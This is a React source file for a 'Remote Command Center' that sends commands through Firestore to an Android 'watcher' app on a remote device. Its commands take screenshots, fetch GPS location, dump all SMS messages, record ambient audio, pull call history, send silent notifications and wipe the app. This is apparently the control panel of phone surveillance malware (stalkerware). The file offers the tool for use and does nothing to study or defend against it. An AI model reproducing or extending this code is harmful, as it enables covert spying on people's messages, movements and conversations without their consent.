import { useState } from 'react'
import { Camera, MapPin, MessageSquare, Mic, Trash2, Phone, RefreshCw, Lock, Bell, Loader2, Check } from 'lucide-react'
import { sendCommand } from '../hooks/useFirestore'

interface Command {
  id: string
  icon: React.ReactNode
  label: string
  desc: string
  color: string
  danger?: boolean
}

const commands: Command[] = [
  { id: 'SNAPSHOT',   icon: <Camera size={18} />,       label: 'Take Snapshot',    desc: 'Capture screen remotely',       color: '#3b82f6' },
  { id: 'LOCATION',   icon: <MapPin size={18} />,       label: 'Get Location',     desc: 'GPS precise fix',               color: '#22c55e' },
  { id: 'SMS_DUMP',   icon: <MessageSquare size={18} />, label: 'Dump SMS',        desc: 'Export all SMS messages',       color: '#a855f7' },
  { id: 'AUDIO',      icon: <Mic size={18} />,          label: 'Record Audio',     desc: '30s ambient audio capture',     color: '#f59e0b' },
  { id: 'CALL_LOG',   icon: <Phone size={18} />,        label: 'Call Logs',        desc: 'Pull full call history',        color: '#06b6d4' },
  { id: 'LOCK',       icon: <Lock size={18} />,         label: 'Lock Device',      desc: 'Trigger screen lock',           color: '#64748b' },
  { id: 'NOTIFY',     icon: <Bell size={18} />,         label: 'Push Alert',       desc: 'Send silent notification',      color: '#ec4899' },
  { id: 'RESTART',    icon: <RefreshCw size={18} />,    label: 'Restart App',      desc: 'Restart the watcher service',   color: '#f59e0b' },
  { id: 'WIPE',       icon: <Trash2 size={18} />,       label: 'Wipe & Uninstall', desc: 'Permanent removal — caution',   color: '#ef4444', danger: true },
]

export default function CommandCenter({ deviceId }: { deviceId: string }) {
  const [executing, setExecuting] = useState<string | null>(null)
  const [done, setDone] = useState<Record<string, boolean>>({})

  const execute = async (cmd: Command) => {
    if (executing) return
    if (cmd.danger && !window.confirm(`⚠ Are you sure you want to send "${cmd.label}"? This cannot be undone.`)) return
    setExecuting(cmd.id)
    await sendCommand(deviceId, cmd.id)
    setDone(prev => ({ ...prev, [cmd.id]: true }))
    setExecuting(null)
    setTimeout(() => setDone(prev => ({ ...prev, [cmd.id]: false })), 3000)
  }

  return (
    <div>
      <div style={{ marginBottom: 20 }}>
        <h2 style={{ fontSize: 16, fontWeight: 700, color: '#e2e8f0', marginBottom: 4 }}>Remote Command Center</h2>
        <p style={{ fontSize: 12, color: '#475569' }}>
          Sends command to Firestore · Android app polls and executes via FCM
        </p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: 10 }}>
        {commands.map(cmd => (
          <button
            key={cmd.id}
            onClick={() => execute(cmd)}
            disabled={!!executing}
            style={{
              display: 'flex', flexDirection: 'column', alignItems: 'flex-start', gap: 8,
              padding: '14px 16px', borderRadius: 12, border: 'none', cursor: executing ? 'not-allowed' : 'pointer',
              background: cmd.danger ? 'rgba(239,68,68,0.08)' : 'rgba(255,255,255,0.03)',
              borderWidth: 1, borderStyle: 'solid',
              borderColor: cmd.danger ? 'rgba(239,68,68,0.2)' : 'rgba(255,255,255,0.06)',
              transition: 'all 0.2s', textAlign: 'left',
              opacity: executing && executing !== cmd.id ? 0.45 : 1,
            }}
          >
            <div style={{ display: 'flex', width: '100%', justifyContent: 'space-between', alignItems: 'center' }}>
              <div style={{ color: done[cmd.id] ? '#22c55e' : cmd.color }}>
                {executing === cmd.id
                  ? <Loader2 size={18} style={{ animation: 'spin 0.8s linear infinite' }} />
                  : done[cmd.id]
                    ? <Check size={18} />
                    : cmd.icon}
              </div>
              {done[cmd.id] && (
                <span style={{ fontSize: 10, color: '#4ade80', fontWeight: 700 }}>Delivered</span>
              )}
            </div>
            <div>
              <div style={{ fontSize: 13, fontWeight: 600, color: '#cbd5e1', marginBottom: 2 }}>{cmd.label}</div>
              <div style={{ fontSize: 11, color: '#475569' }}>{cmd.desc}</div>
            </div>
          </button>
        ))}
      </div>
    </div>
  )
}
